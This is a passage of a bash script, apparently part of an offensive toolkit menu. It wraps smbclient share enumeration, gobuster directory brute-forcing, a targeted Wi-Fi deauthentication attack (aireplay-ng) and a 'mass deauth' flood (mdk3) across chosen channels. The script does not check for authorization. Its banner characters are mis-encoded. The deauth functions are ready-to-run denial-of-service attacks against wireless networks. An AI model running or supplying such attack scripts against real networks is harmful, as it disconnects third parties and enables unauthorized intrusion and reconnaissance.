smbclient(){
printf 'Enter username ---> '
read usrname
printf 'Enter target IP Address ---> '
read targip
gnome-terminal --command="bash -c 'smbclient -U '$usrname' -L //$targip;$SHELL'"
printf "${GREEN}
-------------------------------------
[âœ“] 	     ðŸ’€FINISHEDðŸ’€	 [âœ“] |
-------------------------------------"
}
gobuster(){
wordlist='/usr/share/wordlists/dirbuster/'
printf "Target URL ---> "
read targip
printf "Choose a Wordlist from /usr/share/wordlists/dirbuster/:
1) directory-list-2.3-small.txt
2) directory-list-2.3-medium.txt
3) directory-list-lowercase-2.3-small.txt
4) directory-list-lowercase-2.3-medium.txt"
read choice
if [ $choice == 1 ]
then
	wordlist='/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt'
	
elif [ $choice == 2 ]
then
	wordlist='/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt'	
	
elif [ $choice == 3 ]
then
	wordlist='/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt'
	
elif [ $choice == 4 ]
then
	wordlist='/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt'
else
	echo 'You did not enter a valid parameter!'
	gobuster
fi


gnome-terminal --command="bash -c 'gobuster dir -w $wordlist -u $targip;$SHELL'"
printf "${GREEN}
-------------------------------------
[âœ“] FINISHED SCANNING		 [âœ“] |
-------------------------------------"
}
deauth(){
printf "Enter target BSSID ---> "
read bssid
printf "Enter channel of AP ---> "
read channel
printf "Name of your wireless interface ---> "
read wlan
gnome-terminal --command="bash -c 'airodump-ng $wlan --bssid $bssid --channel $channel ;$SHELL'"
gnome-terminal --command="bash -c 'aireplay-ng -0 0 -a $bssid $wlan;$SHELL'"
}
massdeauth(){
printf "${RED}
-------------------------------------
[ðŸ’€]     MASS DEUATH ATTACK     [ðŸ’€] |
-------------------------------------"
echo ''
printf "Enter the name of your wireless deivce in monitor mode ---> "
read wlan
printf "Enter the channels you would like to deauth on --->"
read channels
printf "Example: 6,11,36"
gnome-terminal --command="bash -c 'echo ðŸ’€ HIT CONTROL C TO STOP THE ATTACK ðŸ’€; mdk3 $wlan d -c $channels;$SHELL'"

}
